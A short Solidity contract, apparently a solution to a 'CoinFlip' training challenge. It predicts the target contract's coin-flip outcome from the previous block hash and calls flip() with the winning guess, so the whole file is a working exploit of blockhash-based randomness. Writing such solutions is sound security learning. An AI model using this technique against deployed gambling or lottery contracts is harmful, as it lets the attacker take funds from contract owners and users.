// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    CoinFlip private coinFlipContract;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        coinFlipContract = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        // Code me!
        /**
         * Pseudocode
         * guess the side correctly based on the same logic in the flip 
         */
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 coinFlip = uint(blockhash(block.number - 1)) / factor;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
